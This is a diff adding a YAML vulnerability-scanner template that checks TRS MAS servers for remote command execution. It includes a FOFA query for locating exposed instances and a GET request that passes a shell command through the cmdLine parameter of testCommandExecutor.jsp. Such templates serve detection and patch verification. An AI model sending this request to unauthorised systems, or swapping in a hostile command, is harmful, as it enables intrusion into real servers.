@@ -1,0 +1,24 @@
+id: trs-mas-remote-command-exec
+
+info:
+  name: 拓尔思-MAS RCE
+  author: xpoc
+  severity: critical
+  verified: true
+  description: |
+    FOFA: app="拓尔思-MAS"
+  reference:
+    - https://mp.weixin.qq.com/s/VECQ2fn7PptQHsVkNo8rQQ
+  tags: trs,rce
+  created: 2023/06/22
+
+set:
+    r1: randomInt(1000000, 2000000)
+    r2: randomInt(2000000, 3000000)
+rules:
+    r0:
+        request:
+            method: GET
+            path: /mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20{{r1}}%20+%20{{r2}}&workDir=&pathEnv=&libPathEnv=
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
+expression: r0()
